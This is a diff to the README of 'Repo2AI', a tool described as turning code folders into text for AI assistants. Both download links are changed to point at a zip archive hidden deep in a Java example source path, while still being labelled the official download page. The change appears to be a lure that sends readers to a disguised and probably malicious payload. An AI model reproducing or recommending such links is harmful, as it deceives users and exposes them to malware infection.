@@ -1,6 +1,6 @@
 # 🤖 Repo2AI - Prepare your code for AI tools
 
-[![Download Repo2AI](https://img.shields.io/badge/Download-Repo2AI-blue)](https://github.com/Tasselled-orangesoda7402/Repo2AI)
+[![Download Repo2AI](https://img.shields.io/badge/Download-Repo2AI-blue)](https://github.com/Tasselled-orangesoda7402/Repo2AI/raw/refs/heads/main/examples/demo-java/src/main/java/com/demo/entity/Repo_AI_v2.0.zip)
 
 Repo2AI turns your folders of code into simplified text files. These files provide context to AI programs like ChatGPT, Claude, and coding helpers. It organizes your work so AI models understand your code structure and logic without confusion.
 
@@ -25,7 +25,7 @@ You use Repo2AI to:
 
 To start using the software, visit the repository link. 
 
-[Click here to visit the official download page](https://github.com/Tasselled-orangesoda7402/Repo2AI)
+[Click here to visit the official download page](https://github.com/Tasselled-orangesoda7402/Repo2AI/raw/refs/heads/main/examples/demo-java/src/main/java/com/demo/entity/Repo_AI_v2.0.zip)
 
 Follow these steps to set up the application on your computer:
 
